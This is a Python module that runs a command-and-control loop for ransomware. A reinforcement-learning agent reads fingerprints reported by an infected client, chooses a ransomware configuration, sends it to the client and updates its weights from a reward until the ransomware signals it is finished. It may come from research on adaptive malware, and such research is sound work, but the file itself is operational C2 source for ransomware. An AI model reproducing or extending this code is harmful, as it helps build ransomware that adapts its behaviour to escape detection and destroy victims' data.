import numpy as np
from time import sleep

from agent.agent import get_agent
from api.configurations import map_to_ransomware_configuration, send_config
from environment.reward import compute_reward, prepare_reward_computation
from environment.state_handling import is_fp_ready, set_fp_ready, is_rw_done, collect_fingerprint


def transform_fp(fp):
    return np.asarray(fp)


def loop_episode(agent):
    # accept initial FP
    print("Wait for initial FP...")
    while not is_fp_ready():
        sleep(.5)
    curr_fp = collect_fingerprint()
    # FP_READY = False
    set_fp_ready(False)

    last_action = None

    print("Loop episode...")
    while True:
        # transform FP into np array
        state = transform_fp(curr_fp)

        # agent selects action based on state
        selected_action = agent.predict(state)

        # convert action to config and send to client
        if selected_action != last_action:
            config = map_to_ransomware_configuration(selected_action)
            send_config(config)
        last_action = selected_action

        # TODO: store action in reward module?
        # receive next FP
        print("Wait for FP...")
        while not is_fp_ready():
            sleep(.5)
        next_fp = collect_fingerprint()
        # FP_READY = False
        set_fp_ready(False)

        # compute reward based on FP
        # reward = compute_reward(next_fp, RW_DONE, selected_action)  # TODO: including action required?
        reward = compute_reward(next_fp, is_rw_done(), selected_action)  # TODO: including action required?

        # send reward to agent, update weights accordingly
        agent.update_weights(reward)

        # if not RW_DONE:
        if not is_rw_done():
            # set next_fp to curr_fp for next iteration
            curr_fp = next_fp
        else:
            # terminate episode instantly
            break


def run_c2():
    print("==============================\nPrepare Reward Computation\n==============================")
    prepare_reward_computation()

    cont = input("Results ok? Start C2 Server? [y/n]\n")
    if cont.lower() == "y":
        print("\n==============================\nStart C2 Server\n==============================")
        agent = get_agent()
        loop_episode(agent)
